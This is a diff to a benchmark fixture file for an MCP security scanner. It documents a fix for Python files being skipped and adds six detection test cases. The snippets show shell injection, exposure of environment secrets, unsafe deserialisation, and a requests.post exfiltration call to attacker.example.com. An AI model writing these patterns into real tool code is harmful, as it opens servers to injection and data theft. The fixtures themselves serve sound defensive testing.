@@ -21,18 +21,22 @@ import type { BenchmarkCase } from "../../types";
  * source-pattern checks (verified by reading the array directly). 6 of
  * them (mcp.subprocess-shell, mcp.os-system, mcp.env-var-exposure-python,
  * mcp.exfiltration-external-request-python, mcp.pickle-load,
- * mcp.yaml-unsafe-load) are Python-only checks that are STRUCTURALLY
- * UNREACHABLE through scanRepository(): DEFAULT_SCAN_CONFIG.includeExtensions
- * (features/security-scanner/config.ts) does not list ".py", so every
- * .py file is dropped at normalizeFiles() with omission reason "binary"
- * before any rule -- including these -- ever runs. Verified directly:
- * scanRepository([{path: "x.py", content: "os.system(cmd)"}]) produces
- * zero findings and one omission {reason: "binary"}. This is a real,
- * scanner-wide gap (affects every rule for every .py file, not just
- * these 6), not something this benchmark-construction pass fixes --
- * documented in BLIND_SPOTS.md and flagged as a P1 candidate in the
- * final report. The remaining 23 source-pattern checks are fixtured
- * below (22 clean + 1 below in ../edge documenting a real FP).
+ * mcp.yaml-unsafe-load) are Python-only checks.
+ *
+ * FIXED in the Detection Accuracy Hardening V1 pass: those 6 checks were
+ * STRUCTURALLY UNREACHABLE through scanRepository() because
+ * DEFAULT_SCAN_CONFIG.includeExtensions (features/security-scanner/config.ts)
+ * did not list ".py", so every .py file was dropped at normalizeFiles()
+ * with omission reason "binary" before any rule -- including these --
+ * ever ran (verified directly: scanRepository on a .py file produced
+ * zero findings and one {reason: "binary"} omission). Fixed by adding
+ * ".py" to SOURCE_EXTENSIONS (features/security-scanner/constants.ts).
+ * This was a scanner-wide gap (affected every rule's Python coverage,
+ * not just these 6) -- see BLIND_SPOTS.md for the full account and the
+ * remaining out-of-scope languages (go/rb/java/php) that share the same
+ * root cause but were not added this pass. All 6 Python checks are now
+ * fixtured below alongside the pre-existing 22 clean JS/TS checks (28
+ * total, +1 documented FP now fixed -- see ../edge).
  *
  * scan-manifest.ts additionally produces ~13 more distinct finding ids
  * from manifest (server.json) analysis, not counted in the "29" at all.
@@ -348,5 +352,71 @@ export const MCP_POSITIVE_CASES: BenchmarkCase[] = [
     source: "benchmark-new",
     description: "MCP manifest server.json is not valid JSON.",
     files: [{ path: "integrations/customer-mcp-server/server.json", content: "{ this is not valid json " }],
+  },
+  {
+    id: "mcp.subprocess-shell-positive-01",
+    ruleId: "agent-scanner.scan_mcp_server.mcp.subprocess-shell",
+    expected: "detect",
+    category: "mcp",
+    language: "python",
+    kind: "positive",
+    source: "benchmark-new",
+    description: "Python subprocess.run() called with shell=True, allowing shell injection.",
+    files: [{ path: "integrations/customer-mcp-server/tool.py", content: "subprocess.run(cmd, shell=True)" }],
+  },
+  {
+    id: "mcp.os-system-positive-01",
+    ruleId: "agent-scanner.scan_mcp_server.mcp.os-system",
+    expected: "detect",
+    category: "mcp",
+    language: "python",
+    kind: "positive",
+    source: "benchmark-new",
+    description: "Python os.system() executes a command through the shell.",
+    files: [{ path: "integrations/customer-mcp-server/tool.py", content: "os.system(cmd)" }],
+  },
+  {
+    id: "mcp.env-var-exposure-python-positive-01",
+    ruleId: "agent-scanner.scan_mcp_server.mcp.env-var-exposure-python",
+    expected: "detect",
+    category: "mcp",
+    language: "python",
+    kind: "positive",
+    source: "benchmark-new",
+    description: "Python os.environ accessed inside an MCP tool handler -- may be exposed in tool output.",
+    files: [{ path: "integrations/customer-mcp-server/tool.py", content: "key = os.environ.get('API_KEY')" }],
+  },
+  {
+    id: "mcp.exfiltration-external-request-python-positive-01",
+    ruleId: "agent-scanner.scan_mcp_server.mcp.exfiltration-external-request-python",
+    expected: "detect",
+    category: "mcp",
+    language: "python",
+    kind: "positive",
+    source: "benchmark-new",
+    description: "Python requests.post() sends data to a literal external (non-localhost) URL.",
+    files: [{ path: "integrations/customer-mcp-server/tool.py", content: "requests.post('https://attacker.example.com/collect')" }],
+  },
+  {
+    id: "mcp.pickle-load-positive-01",
+    ruleId: "agent-scanner.scan_mcp_server.mcp.pickle-load",
+    expected: "detect",
+    category: "mcp",
+    language: "python",
+    kind: "positive",
+    source: "benchmark-new",
+    description: "pickle.load() deserializes arbitrary Python objects -- can execute arbitrary code if input is attacker-controlled.",
+    files: [{ path: "integrations/customer-mcp-server/tool.py", content: "data = pickle.load(f)" }],
+  },
+  {
+    id: "mcp.yaml-unsafe-load-positive-01",
+    ruleId: "agent-scanner.scan_mcp_server.mcp.yaml-unsafe-load",
+    expected: "detect",
+    category: "mcp",
+    language: "python",
+    kind: "positive",
+    source: "benchmark-new",
+    description: "yaml.load() without SafeLoader can execute arbitrary Python.",
+    files: [{ path: "integrations/customer-mcp-server/tool.py", content: "data = yaml.load(f)" }],
   },
 ];
